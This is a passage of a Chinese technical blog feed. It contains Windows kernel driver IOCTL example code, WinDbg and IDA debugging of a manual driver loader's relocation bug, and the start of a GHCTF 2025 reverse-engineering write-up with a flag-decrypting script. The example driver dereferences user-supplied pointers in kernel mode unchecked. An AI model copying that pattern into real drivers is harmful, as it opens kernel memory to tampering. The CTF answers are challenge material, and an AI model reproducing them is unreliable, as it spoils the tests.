class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DRIVER_SYM <span class="string">L&quot;\\??\\myiotest&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CASE0 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line">HANDLE hDevice;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">MyInputBuffer</span> &#123;</span></span><br><span class="line">CHAR initstring[<span class="number">100</span>];<span class="comment">//输入</span></span><br><span class="line">CHAR outstring[<span class="number">100</span>];<span class="comment">//输出</span></span><br><span class="line">ULONG len;<span class="comment">//长度</span></span><br><span class="line">&#125;MIB, * PMIB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">MyEasyIo</span> &#123;</span></span><br><span class="line">ULONG type;<span class="comment">//处理类型</span></span><br><span class="line">ULONG64 in;<span class="comment">//处理参数</span></span><br><span class="line">ULONG64 is;<span class="comment">//是否继续</span></span><br><span class="line">&#125;MEI, * PMEI;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(PMEI m, PMIB in)</span> &#123;</span><br><span class="line">ULONG len = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请选择您的功能(倒置 1，单双 2): &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m-&gt;type);</span><br><span class="line">getchar();</span><br><span class="line">fgets(in-&gt;initstring, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">while</span> (in-&gt;initstring[len] != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">len++;</span><br><span class="line">in-&gt;initstring[len] = <span class="number">0</span>;</span><br><span class="line">in-&gt;len = len;</span><br><span class="line">m-&gt;in = (ULONG64)in;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">IoC</span><span class="params">(PMEI m)</span> &#123;</span><br><span class="line">ULONG retlen = <span class="number">0</span>;</span><br><span class="line">DeviceIoControl(hDevice, CASE0, m, <span class="keyword">sizeof</span>(MEI), m, <span class="keyword">sizeof</span>(MEI), &amp;retlen, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">hDevice = CreateFile(_DRIVER_SYM, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开设备失败 error:%d \r\n&quot;</span>, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MEI m;</span><br><span class="line">MIB in;</span><br><span class="line">m.is = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (m.is) &#123;</span><br><span class="line">init(&amp;m, &amp;in);</span><br><span class="line">IoC(&amp;m);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;result=%s\r\n是否继续?\r\n&quot;</span>, in.outstring);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m.is);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">L&quot;\\device\\myiotest&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOLICLINK_NAME <span class="string">L&quot;\\??\\myiotest&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CASE0 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">MyInputBuffer</span> &#123;</span></span><br><span class="line">CHAR initstring[<span class="number">100</span>];<span class="comment">//输入</span></span><br><span class="line">CHAR outstring[<span class="number">100</span>];<span class="comment">//输出</span></span><br><span class="line">ULONG len;<span class="comment">//长度</span></span><br><span class="line">&#125;MIB, * PMIB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">MyEasyIo</span> &#123;</span></span><br><span class="line">ULONG type;<span class="comment">//处理类型</span></span><br><span class="line">ULONG64 in;<span class="comment">//处理参数</span></span><br><span class="line">ULONG64 is;<span class="comment">//是否继续</span></span><br><span class="line">&#125;MEI, * PMEI;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span><br><span class="line">&#123;</span><br><span class="line">UNICODE_STRING SymbolicLinkName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">DbgPrint(<span class="string">&quot;[db]: Close...\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">RtlInitUnicodeString(&amp;SymbolicLinkName, SYMBOLICLINK_NAME);</span><br><span class="line">IoDeleteSymbolicLink(&amp;SymbolicLinkName);</span><br><span class="line">IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Dispatch</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span><br><span class="line">&#123;</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: Being work...\r\n&quot;</span>);</span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS <span class="title function_">myDispatch</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span><br><span class="line">&#123;</span><br><span class="line">PIO_STACK_LOCATION io = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line">ULONG ICC = io-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: In %s\r\n&quot;</span>, __FUNCTION__);</span><br><span class="line"><span class="comment">//DbgBreakPoint();</span></span><br><span class="line"></span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: MajorFunction: %x\r\n&quot;</span>, io-&gt;MajorFunction);</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: InputBufferLength: %d\r\n&quot;</span>, io-&gt;Parameters.DeviceIoControl.InputBufferLength);</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: OutputBufferLength: %d\r\n&quot;</span>, io-&gt;Parameters.DeviceIoControl.OutputBufferLength);</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: IoControlCode: %d\r\n&quot;</span>, io-&gt;Parameters.DeviceIoControl.IoControlCode);</span><br><span class="line"></span><br><span class="line">ULONG* num;</span><br><span class="line">ULONG result;</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: SystemBuffer: %p\r\n&quot;</span>, pIrp-&gt;AssociatedIrp.SystemBuffer);</span><br><span class="line"><span class="comment">//DbgBreakPoint();</span></span><br><span class="line">PMEI myezio = (PMEI)pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line"><span class="keyword">switch</span> (myezio-&gt;type)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">&#123;</span><br><span class="line">PMIB input = (PMIB)myezio-&gt;in;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; input-&gt;len; i++)</span><br><span class="line">&#123;</span><br><span class="line">input-&gt;outstring[input-&gt;len - <span class="number">1</span> - i] = input-&gt;initstring[i];</span><br><span class="line">&#125;</span><br><span class="line">input-&gt;outstring[input-&gt;len] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">&#123;</span><br><span class="line">PMIB input = (PMIB)myezio-&gt;in;</span><br><span class="line">ULONG i, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; input-&gt;len; i+=<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">input-&gt;outstring[j++] = input-&gt;initstring[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; input-&gt;len; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">input-&gt;outstring[j++] = input-&gt;initstring[i];</span><br><span class="line">&#125;</span><br><span class="line">input-&gt;outstring[j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//正确返回</span></span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">pIrp-&gt;IoStatus.Information = io-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line">IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)</span></span><br><span class="line">&#123;</span><br><span class="line">NTSTATUS status = <span class="number">0</span>;</span><br><span class="line">ULONG    uIndex = <span class="number">0</span>;</span><br><span class="line">PDEVICE_OBJECT pDeviceObj = <span class="literal">NULL</span>;</span><br><span class="line">UNICODE_STRING Devicename;</span><br><span class="line">UNICODE_STRING SymbolicLinkName;</span><br><span class="line"></span><br><span class="line">RtlInitUnicodeString(&amp;Devicename, DEVICE_NAME);</span><br><span class="line"></span><br><span class="line">status = IoCreateDevice(pDriver, <span class="number">0</span>, &amp;Devicename,</span><br><span class="line">FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &amp;pDeviceObj);</span><br><span class="line"><span class="keyword">if</span> (status != STATUS_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;创建设备失败! \r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line">pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;   </span><br><span class="line"></span><br><span class="line">RtlInitUnicodeString(&amp;SymbolicLinkName, SYMBOLICLINK_NAME);</span><br><span class="line"></span><br><span class="line">status = IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;Devicename);</span><br><span class="line"><span class="keyword">if</span> (status != STATUS_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;创建符号链接失败! \r\n&quot;</span>);</span><br><span class="line">IoDeleteDevice(pDeviceObj);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = Dispatch;</span><br><span class="line">pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = Dispatch;</span><br><span class="line">pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = myDispatch;</span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">DbgPrint(<span class="string">&quot;[db]: Finish...\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Y8Jta">驱动加载</h2>首先我的代码爆蓝屏了，总是蓝屏重启十分麻烦，所以第一个要学的就是异常捕捉<h3 id="GFL22">异常</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__try</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像这样捕捉异常来避免蓝屏</p><h3 id="Fik2g">分析</h3>我的蓝屏发生在最后EntryPoint的地方，于是可以<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;EntryPointFunc: %x\n&quot;</span>, EntryPointFunc);</span><br><span class="line"><span class="built_in">DbgBreakPoint</span>();</span><br></pre></td></tr></table></figure><p>打印进入点，然后下断点，方便后续在windbg中操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EntryPointFunc: <span class="number">85854000</span></span><br><span class="line">Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line">DLTools!LoadDriver<span class="number">+0xb6</span>:</span><br><span class="line">a175f1fa cc              <span class="type">int</span>     <span class="number">3</span></span><br><span class="line">kd&gt;</span><br></pre></td></tr></table></figure><p>停住之后我们可以u 85854000来观察字节码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; u <span class="number">85854000</span> </span><br><span class="line"><span class="number">85854000</span> <span class="number">8</span>bff            mov     edi,edi</span><br><span class="line"><span class="number">85854002</span> <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">85854003</span> <span class="number">8</span>bec            mov     ebp,esp</span><br><span class="line"><span class="number">85854005</span> e806000000      call    <span class="number">85854010</span></span><br><span class="line"><span class="number">8585400</span>a <span class="number">5</span>d              pop     ebp</span><br><span class="line"><span class="number">8585400</span>b e9f0cfffff      jmp     <span class="number">85851000</span></span><br></pre></td></tr></table></figure><p>可以看到入口点是没有问题的，那么手动下断点运行过去</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; bp <span class="number">85854000</span></span><br><span class="line">kd&gt; g</span><br></pre></td></tr></table></figure><p>最后发现是在85854010函数崩掉的，用ida查看源码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">INIT:<span class="number">00404000</span> <span class="number">8</span>B FF                         mov     edi, edi</span><br><span class="line">INIT:<span class="number">00404002</span> <span class="number">55</span>                            push    ebp</span><br><span class="line">INIT:<span class="number">00404003</span> <span class="number">8</span>B EC                         mov     ebp, esp</span><br><span class="line">INIT:<span class="number">00404005</span> E8 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                call    ___security_init_cookie</span><br><span class="line">INIT:<span class="number">00404005</span></span><br><span class="line">INIT:<span class="number">0040400</span>A <span class="number">5</span>D                            pop     ebp</span><br><span class="line">INIT:<span class="number">0040400</span>B E9 F0 CF FF FF                jmp     _DriverEntry@<span class="number">8</span>                  ; <span class="built_in">DriverEntry</span>(x,x)</span><br></pre></td></tr></table></figure><p>可以看到应该是在___security_init_cookie函数中崩了，进去发现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     dword ptr ds:[<span class="number">00403004</span>h],eax</span><br></pre></td></tr></table></figure><p>最后的赋值重定位表没有正确定位，找到问题原因了，是重定位表写的有问题</p><p>排查发现计算获得重定位表基址的时候+的是PIMAGE…而不是IMAGE</p><p><code>PIMAGE_RELOC RelocationBlock = (PIMAGE_RELOC)((PUINT8)pImageReloc + sizeof(PIMAGE_BASE_RELOCATION));</code></p></----R0某个函数里>]]></content>
      
      
      <categories>
          
          <category> 逆向行驶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ghctf2025-re-wp</title>
      <link href="/2025/04/09/2025ghctf/"/>
      <url>/2025/04/09/2025ghctf/</url>
      
        <content type="html"><![CDATA[<p>写了逆向方向7个题</p><span id="more"></span><h2 id="ASM-Signin"><a href="#ASM-Signin" class="headerlink" title="ASM?Signin!"></a>ASM?Signin!</h2><p>汇编题，直接梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处理后的DATA1数组（经过DO1过程）</span></span><br><span class="line">processed_data1 = [</span><br><span class="line">    <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x25</span>,</span><br><span class="line">    <span class="number">0x3F</span>, <span class="number">0x27</span>, <span class="number">0x34</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x34</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x3A</span>, <span class="number">0x3B</span>, <span class="number">0x38</span>, <span class="number">0x39</span>,</span><br><span class="line">    <span class="number">0x3E</span>, <span class="number">0x3F</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>,</span><br><span class="line">    <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x28</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># DATA2数组（加密后的目标数据）</span></span><br><span class="line">data2 = [</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x77</span>, <span class="number">0x77</span>, <span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x4F</span>, <span class="number">0x46</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x47</span>, <span class="number">0x6F</span>, <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x41</span>, <span class="number">0x13</span>, <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0x5E</span>, <span class="number">0x67</span>, <span class="number">0x5F</span>, <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x58</span>, <span class="number">0x63</span>, <span class="number">0x7D</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x0D</span>, <span class="number">0x0D</span>, <span class="number">0x50</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密每个块</span></span><br><span class="line">flag_bytes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="comment"># 获取DATA2的当前四字节块</span></span><br><span class="line">    e0, e1, e2, e3 = data2[i*<span class="number">4</span> : (i+<span class="number">1</span>)*<span class="number">4</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取对应的处理后的DATA1块</span></span><br><span class="line">    d_block = processed_data1[i*<span class="number">4</span> : (i+<span class="number">1</span>)*<span class="number">4</span>]</span><br><span class="line">    d1 = d_block[<span class="number">1</span>]  <span class="comment"># 第二个字节用于异或e0</span></span><br><span class="line">    d2 = d_block[<span class="number">2</span>]  <span class="comment"># 第三个字节用于异或e1和e2</span></span><br><span class="line">    d3 = d_block[<span class="number">3</span>]  <span class="comment"># 第四个字节用于异或e3</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 异或解密</span></span><br><span class="line">    b0 = e0 ^ d1</span><br><span class="line">    b1 = e1 ^ d2</span><br><span class="line">    b2 = e2 ^ d2</span><br><span class="line">    b3 = e3 ^ d3</span><br><span class="line">    </span><br><span class="line">    flag_bytes.extend([b0, b1, b2, b3])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字节转换为字符串</span></span><br><span class="line">flag = <span class="built_in">bytes</span>(flag_bytes).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#NSSCTF&#123;W0w_y0u&#x27;re_g00d_@t_@5M!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="FishingKit"><a href="#FishingKit" class="headerlink" title="FishingKit"></a>FishingKit</h2><p>hook+tea+z3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r8</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v8; <span class="comment">// r8</span></span><br><span class="line">  __int64 v10; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v11; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">56</span>]; <span class="comment">// [rsp+38h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">56</span>]; <span class="comment">// [rsp+70h] [rbp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="number">0x14u</span>i64);</span><br><span class="line">  <span class="built_in">memset</span>(v14, <span class="number">0</span>, <span class="number">0x32u</span>i64);</span><br><span class="line">  <span class="built_in">memset</span>(Str1, <span class="number">0</span>, <span class="number">0x32u</span>i64);</span><br><span class="line">  